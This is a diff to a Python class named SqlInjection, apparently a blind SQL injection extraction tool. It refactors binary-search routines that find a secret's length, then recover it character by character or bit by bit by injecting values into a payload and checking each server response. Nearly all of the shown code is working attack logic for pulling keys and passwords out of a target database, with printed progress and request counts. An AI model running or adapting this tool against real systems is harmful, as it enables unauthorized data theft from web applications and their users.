@@ -73,43 +73,104 @@ class SqlInjection:
             print(' no')
         return a, b
 
-    def __binary_key(self, check_func: Callable, a, b, position=1, print_resp=False, mode='') -> int:
+    def find_key_len(self, check_func: Callable, right=32, print_resp=False, mode='') -> int:
+        left = -1
+        num_of_requests = 0
         tmp = self.payload
-        print('\nposition', position)
+        while right > left + 1:
+            middle = (left + right) // 2
+            if '%s' in self.payload:
+                if mode == 'in':
+                    self.payload = tmp.replace('%s', ','.join([str(n) for n in range(1, middle)]))
+                else:
+                    self.payload = tmp.replace('%s', str(middle))
+            right, left = self.__check_responce(check_func, right, left,
+                                                middle, middle, print_resp)
+            num_of_requests += 1
+            self.payload = tmp
+        print('num of requests:', num_of_requests)
+        print(f'lenght key is: {Fore.GREEN}{right}{Fore.RESET}')
+        return right
+
+    def find_key_len_in(self, check_func: Callable, right=32, print_resp=False, mode='') -> int:
+        left = -1
+        num_of_requests = 0
+        tmp = self.payload
+        while right > left + 1:
+            middle = (left + right) // 2
+            middle_1 = left + (right - left) // 2 + 1
+            print('mids', middle, middle_1)
+            if '%s' in self.payload:
+                if mode == 'in':
+                    self.payload = tmp.replace('%s', ','.join([str(n) for n in range(1, middle)]))
+                else:
+                    self.payload = tmp.replace('%s', str(middle))
+            # right, left = self.__check_responce(check_func, right, left, middle, middle, print_resp)
+            left, right = self.__check_responce(check_func, left, right, middle - 1, middle, print_resp)
+            num_of_requests += 1
+            self.payload = tmp
+        print('num of requests:', num_of_requests)
+        print(f'lenght key is: {Fore.GREEN} left:{left} right:{right}{Fore.RESET}')
+        return left
+
+
+    def one_binary(self, check_func: Callable, left=32, right=127,
+                   print_resp=False, mode='num'):
+        """
+        """
+        num_of_requests = 0
+        tmp = self.payload
+        a = left
+        b = right
         while b - a != 0:
             middle = a + (b - a) // 2 + 1
             if '%s' in self.payload:
-                if mode == 'hex':
+                if mode == 'num':
+                    self.payload = tmp.replace('%s', str(middle))
+                elif mode == 'hex':
                     self.payload = tmp.replace('%s', hex(middle))
-                elif mode == 'letter':
-                    self.payload = tmp.replace('%d', str(position)).replace('%s', chr(middle))
-                elif mode == 'in':
-                    self.payload = tmp.replace('%d', str(position)).replace('%s', ','.join([str(n) for n in range(a, middle)]))
-                else:
-                    self.payload = tmp.replace('%d', str(position)).replace('%s', str(middle))
-
-            a, b = self.__check_responce(check_func, a, b, middle - 1, middle, print_resp)
+            a, b = self.__check_responce(check_func, a, b, middle-1, middle, print_resp)
+            num_of_requests += 1
             self.payload = tmp
+        print('num of requests:', num_of_requests)
+        print('binary found result: ', a)
         return a
 
-    def find_key_len(self, check_func: Callable, left=-1, right=32, print_resp=False, mode='') -> int:
-        res = self.__binary_key(check_func, left, right, print_resp=print_resp, mode=mode)
-        print(f'lenght key is: {Fore.GREEN}{res}{Fore.RESET}')
-        return res
-
-    def one_binary(self, check_func: Callable, left=32, right=127, position=1, print_resp=False, mode=''):
-        res = self.__binary_key(check_func, left, right, position=position, print_resp=print_resp, mode=mode)
-        print(f'binary found result: {Fore.GREEN}{res}{Fore.RESET}')
-        return res
-
-    def find_binary(self, check_func: Callable, len_of_key: int, left=32, right=127, print_resp=False, mode='',
+    def find_binary(self, check_func: Callable, len_of_key: int,
+                    left=32, right=127, print_resp=False, mode='',
                     coding='dec', start_i=1) -> str:
+        """
+        :param start_i:
+        :param check_func: function for check success in response
+        :param len_of_key: lenght key
+        :param right max ascii code of symbol
+        :param left min ascii code of symbol
+        :param print_resp: print html response
+        :param coding: dec, hex  for type symbols in database
+        :param mode: type of query
+        :return:
+        """
+        num_of_requests = 0
+        tmp = self.payload
         result = ''
         res = ''
         if coding == 'hex' and left == 32:
             left = 20
         for i in range(start_i, len_of_key + start_i):
-            a = self.one_binary(check_func, left=left, right=right, position=i, print_resp=print_resp, mode=mode)
+            a = left
+            b = right
+            while b - a != 0:
+                middle = a + (b - a) // 2 + 1
+                if '%d' in self.payload and '%s' in self.payload:
+                    if mode == 'letter':
+                        self.payload = tmp.replace('%d', str(i)).replace('%s', chr(middle))
+                    if mode == 'in':
+                        self.payload = tmp.replace('%d', str(i)).replace('%s', ','.join([str(n) for n in range(a, middle)]))
+                    else:
+                        self.payload = tmp.replace('%d', str(i)).replace('%s', str(middle))
+                a, b = self.__check_responce(check_func, a, b, middle-1, middle, print_resp)
+                num_of_requests += 1
+                self.payload = tmp
             if coding == 'dec':
                 res = chr(a)
             elif coding == 'hex':
@@ -118,6 +179,8 @@ class SqlInjection:
             print(f'symbol {i} in key is: {Fore.LIGHTBLUE_EX}{res}{Fore.RESET}')
             result += res
             print(f'result on this step is: {Fore.LIGHTRED_EX}{result}{Fore.RESET}')
+
+        print('num of requests:', num_of_requests)
         return result
 
     def find_pass_over_bits(self, check_func: Callable, len_of_key: int,
@@ -127,6 +190,7 @@ class SqlInjection:
         unicode_len_bit: len of char in bits, 8 for ascii, 32 for utf-32 etc.
         """
         result = ''
+        num_of_requests = 0
         tmp = self.payload
         for j in range(1, len_of_key * 8 // unicode_len_bit + 1):
             bit = ''
@@ -134,6 +198,7 @@ class SqlInjection:
                 self.payload = tmp.replace('%s1', str(j)).replace('%s2', str(unicode_len_bit)).replace('%s3', str(i))
                 a, b = self.__check_responce(check_func, bit, bit, bit+'1', bit+'0', print_resp)
                 bit = a if len(a) > len(b) else b
+                num_of_requests += 1
                 self.payload = tmp
 
             print(f'{Fore.BLUE}{bit}{Fore.RESET}', hex(int(bit, 2))[2:])
@@ -141,6 +206,7 @@ class SqlInjection:
             print(f'{Fore.LIGHTRED_EX}{uni_letter}{Fore.RESET}')
             result += uni_letter
 
+        print('num_of_requests:', num_of_requests)
         print(f'result: {Fore.LIGHTMAGENTA_EX}{result}{Fore.RESET}')
         return result
 
